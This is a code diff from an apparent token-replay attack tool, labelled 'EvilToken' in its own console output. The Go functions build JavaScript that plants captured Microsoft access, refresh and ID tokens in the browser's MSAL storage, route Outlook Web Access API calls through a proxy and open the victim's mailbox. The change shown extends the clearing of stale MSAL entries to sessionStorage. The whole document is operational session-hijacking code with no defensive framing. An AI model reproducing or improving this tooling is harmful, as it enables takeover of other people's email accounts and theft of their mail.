@@ -814,7 +814,11 @@ if(!window.crypto||!window.crypto.subtle){
   if(!window.crypto||!window.crypto.subtle){
     try{window.crypto=_newCrypto;}catch(e){}}
 }
-/* ── msal.token.keys.* null-array guard (same as inject script) ── */
+/* ── Wipe any stale MSAL entries at THIS proxy origin ──
+   migrateIdTokens crashes if msal.token.keys.* has null arrays from old sessions.
+   Since auth is handled server-side (Bearer), MSAL storage is not needed here. */
+try{['localStorage','sessionStorage'].forEach(function(s){try{var st=window[s];Object.keys(st).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){st.removeItem(k);});}catch(e){}});}catch(e){}
+/* ── msal.token.keys.* null-array guard (runtime safety net) ── */
 (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());
 /* ── URL rewrite: send OWA API calls through our proxy ── */
 var _base=%q;
@@ -1454,8 +1458,8 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
 	js.WriteString(";\n")
-	js.WriteString("  /* 2b. Wipe any stale MSAL entries (null arrays from old inject crash migrateIdTokens) */\n")
-	js.WriteString("  try{Object.keys(localStorage).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){localStorage.removeItem(k);});}catch(e){}\n")
+	js.WriteString("  /* 2b. Wipe stale MSAL entries from BOTH localStorage AND sessionStorage */\n")
+	js.WriteString("  try{['localStorage','sessionStorage'].forEach(function(s){try{var st=window[s];Object.keys(st).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){st.removeItem(k);});}catch(e){}});}catch(e){}\n")
 	js.WriteString(`  Object.keys(d).forEach(function(k){
     var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);
     try{localStorage.setItem(k,v);}catch(e){}
@@ -1875,8 +1879,8 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
 	js.WriteString(";\n")
-	js.WriteString("  /* Wipe any stale MSAL entries — null arrays from prior broken inject crash migrateIdTokens */\n")
-	js.WriteString("  try{Object.keys(localStorage).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){localStorage.removeItem(k);});}catch(e){}\n")
+	js.WriteString("  /* Wipe stale MSAL entries from BOTH localStorage AND sessionStorage */\n")
+	js.WriteString("  try{['localStorage','sessionStorage'].forEach(function(s){try{var st=window[s];Object.keys(st).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){st.removeItem(k);});}catch(e){}});}catch(e){}\n")
 	js.WriteString("  Object.keys(d).forEach(function(k){\n    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);\n    try{localStorage.setItem(k,v);}catch(e){}\n    try{sessionStorage.setItem(k,v);}catch(e){}\n  });\n")
 	js.WriteString("  console.log('%c[EvilToken] ✓ MSAL cache written — navigating to OWA...','color:#0a0;font-size:14px;font-weight:bold');\n")
 	js.WriteString("  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},400);\n")
